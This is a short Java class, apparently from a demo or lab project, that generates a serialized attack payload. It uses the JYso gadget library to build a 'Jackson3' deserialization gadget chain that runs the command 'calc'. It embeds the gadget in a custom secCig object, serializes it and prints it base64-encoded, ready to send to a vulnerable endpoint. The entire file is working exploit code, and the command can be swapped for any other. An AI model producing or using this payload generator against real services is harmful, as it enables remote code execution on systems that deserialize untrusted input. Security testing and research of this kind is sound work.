package com.example.demo.demos.web;

import com.qi4l.JYso.gadgets.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception {
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("Jackson3");
        ObjectPayload                        payload      = payloadClass.newInstance();
        Object                               object       = payload.getObject("calc");

        secCig rootObj = new secCig();
        rootObj.setMessage("qi4l");
        rootObj.setSecObject(object);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream    oos  = new ObjectOutputStream(baos);
        oos.writeObject(rootObj);
        oos.close();

        byte[] payloadBytes  = baos.toByteArray();
        String base64Payload = Base64.getEncoder().encodeToString(payloadBytes);
        System.out.println(base64Payload);
    }
}
